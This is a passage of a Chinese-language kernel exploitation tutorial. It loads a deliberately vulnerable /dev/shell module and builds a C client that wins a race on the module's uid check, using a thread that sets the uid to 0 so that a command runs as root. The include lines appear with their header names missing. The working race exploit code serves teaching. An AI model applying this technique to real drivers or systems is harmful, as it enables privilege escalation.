    $ insmod shell.ko # This will insert (load) our freshly compiled module
    ...
    $ chmod 777 /dev/shell # We want the character device to be accesible by any user
既然驱动程序已经设置好了，让我们开始在客户端上工作吧!我们从一个基本的框架开始，包括我们需要的一切:
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(void)
    {
        return EXIT_SUCCESS;
    }
目前并没有做什么事情，一旦其被编译完成会返回一个成功消息。
第一步是打开我们的设备，我们可以通过使用 `open` 系统调用。
`open` 系统调用接受两个参数：一个是 `pathname` 和一些 `flags`。我们使用我们自己的设备作为 `pathname` 并且将
flags 设置为 `read + write`。
    // O_RDWR stands for open it for both reading and writing.
    int fd = open("/dev/shell", O_RDWR);
当然，一旦我们打开了我们的字符设备，我们也得关闭它！这就是 `close` 系统调用做的事情！
    int main(void)
    {
        int fd = open("/dev/shell", O_RDWR);
        //XXX: DO SOMETHING USEFUL HERE
        close(fd);
    }
现在是时候让我们做一些有用的事情了；我们知道我们的设备有一个 IOCTL 处理器它会忽略 `cmd` 但是接受一个指向 `struct user_data`
的指针作为参数！
首先在我们的客户端中包含 `user_data` 结构体并且发送一个 IOCTL 请求！如下所示：
    // This defines the struct that we'll give as an argument to our IOCTL request.
    typedef struct user_data {
        int uid;
        char    cmd[100];
    }  user_data;
    int main(void)
    {
        // This creates an instance of the user_data structure called 'udat'.
        user_data udat; 
        // We'll initialize the data of the structure here!
        // our uid is the uid of my current user.
        udat.uid = 1000;
        // Copy the string echo 'foo' > /tmp/hacker to our command as a test.
        strcpy(udat.cmd, "echo 'foo' > /tmp/hacker"); 
        // Open our driver
        int fd = open("/dev/shell", O_RDWR);
        // Make our actual IOCTL request with the data we just initialized. 
        ioctl(fd, 0, &udat);
        // Close our driver again
        close(fd);
        return EXIT_SUCCESS;
    }
我们的简易客户端已经完成了！这将会以我们自己的用户身份执行命令。
要注意的是上面的例子没有执行任何的错误检查，如果你想这么做，这部分交给你自己。
现在来看看这个漏洞的实际利用，这将要求我们在与内核模块的 uid 验证的竞争中获胜。我们可以通过在其他线程中修改我们的 `uid` 来实现，这里我们需要用到
`pthread` 库。
在 `pthread` 里，一个线程可以使用 `pthread_t` 数据类型来声明。接着我们可以使用 `pthread_create()`
来开启一个新的进程。
> 来源于文档：pthread_create() 函数在调用的进程中开启一个新的线程。这个新的线程通过调用 start_routine()
> 来开启执行；arg 被作为一个单独的参数传递给 start_routine()。
让我们来更新我们的代码去开启一个新的线程！
    typedef struct user_data {
        int uid;
        char    cmd[100];
    }  user_data;
    void change_uid_root(void *struct_ptr)
    {
        // TODO: Add code to change the uid in our structure.
        printf("Hello from our thread!\n");
    }
    int main(void)
    {
        // Declare an instance of a thread
        pthread_t thread;
        user_data udat;
        udat.uid = 1000;
        strcpy(udat.cmd, "echo 'foo' > /tmp/hacker");
        // Create a thread within our process that calls the change_uid_root() function
        // With our udat (user_data) structure as an argument.
        pthread_create(&thread, NULL, change_uid_root, &udat);
        int fd = open("/dev/shell", O_RDWR);
        ioctl(fd, 0, &udat);
        // Wait for our thread to stop
        pthread_join(thread, NULL);
        close(fd);
        return EXIT_SUCCESS;
    }
这是一个很好的开始。很显然，代码还没有完成，不过到目前为止：
  * 我们定义和初始化了我们自己的 `user_data` 结构体并且建立了一个简单的客户端用于我们的 IOCTL 处理程序。
  * 使用 IOCTL 请求，我们可以真正的执行命令了。
  * 我们创建了一个线程，它真正的可以打印一些什么！
下一步是去修改 `change_uid_root()` 函数，这样我们就可以在保持修改我们的 `uid` 的同时仍然发送合法的 IOCTL
请求。通过这种方式，我们可以尝试在验证完成后绕过内核修改我们的 uid !
让我们开始这一步吧!
    // Add a bit of state tracking
    // So we can stop the thread when our for loop is done
    int finish = 0;
    typedef struct user_data {
        int uid;
        char    cmd[100];
    }  user_data;
    void change_uid_root(void *struct_ptr)
    {
        user_data *udat = struct_ptr;
        // While we're not finished, keep trying to change the uid to 0 in this thread. 
        while (finish == 0)
            udat->uid = 0;
    }
    int main(void)
    {
        pthread_t thread;
        user_data udat;
        udat.uid = 1000;
        strcpy(udat.cmd, "echo 'foo' > /tmp/hacker");
        pthread_create(&thread, NULL, change_uid_root, &udat);
        int fd = open("/dev/shell", O_RDWR);
        // Try running 100 legitimate IOCTL requests
        // while our thread is trying to change the uid to 0
        // we keep resetting our uid 
        // to our initial value otherwise it will stay 0 after the thread
        for (int i = 0; i < 100; i++) {
            ioctl(fd, 0, &udat);
            udat.uid = 1000;
        }
        // After our loop we should make our thread stop.
        finish = 1;
        pthread_join(thread, NULL);
        close(fd);
        return EXIT_SUCCESS;
    }
这部分代码在我的机器上编译和执行后会赢得竞争并且以 root 用户身份创建一个 `/tmp/hacker`
文件！与所有的条件竞争漏洞利用一样，你可能需要去改变一些变量，比如尝试的次数和线程的数量使得其生效。
这就是第一部分的全部内容!我希望你会喜欢。欢迎评论或建议 `jordy [a-t] pwning.systems`